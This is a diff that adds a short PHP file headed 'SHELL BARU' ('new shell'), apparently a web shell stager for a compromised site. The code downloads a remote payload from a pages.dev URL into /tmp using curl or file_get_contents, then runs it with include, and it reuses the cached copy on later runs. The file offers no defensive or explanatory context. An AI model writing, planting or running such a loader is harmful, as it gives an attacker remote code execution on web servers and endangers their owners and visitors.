@@ -1,0 +1,40 @@
+SHELL BARU
+
+<?php
+$url  = 'https://d1921aa0ca3c1146a01520c04e6caa9e.pages.dev/enc.txt';
+$dest = '/tmp/tmp7b3c9cic';
+function download_with_curl($url, $dest) {
+    $ch = curl_init($url);
+    $fh = fopen($dest, 'w');
+    curl_setopt_array($ch, [
+        CURLOPT_FILE => $fh,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_TIMEOUT => 20,
+        CURLOPT_SSL_VERIFYPEER => true,
+        CURLOPT_FAILONERROR    => true,
+    ]);
+    $ok = curl_exec($ch);
+    curl_close($ch);
+    fclose($fh);
+    return $ok;
+}
+function download_with_fgc($url, $dest) {
+    $data = @file_get_contents($url);
+    if ($data !== false) {
+        return file_put_contents($dest, $data) !== false;
+    }
+    return false;
+}
+if (file_exists($dest) && filesize($dest) > 0) {
+    include $dest;
+    exit;
+}
+if (function_exists('curl_init')) {
+    download_with_curl($url, $dest);
+}
+if (!file_exists($dest) || filesize($dest) === 0) {
+    if (!download_with_fgc($url, $dest) || filesize($dest) === 0) {
+        exit("0kbn");
+    }
+}
+include $dest;
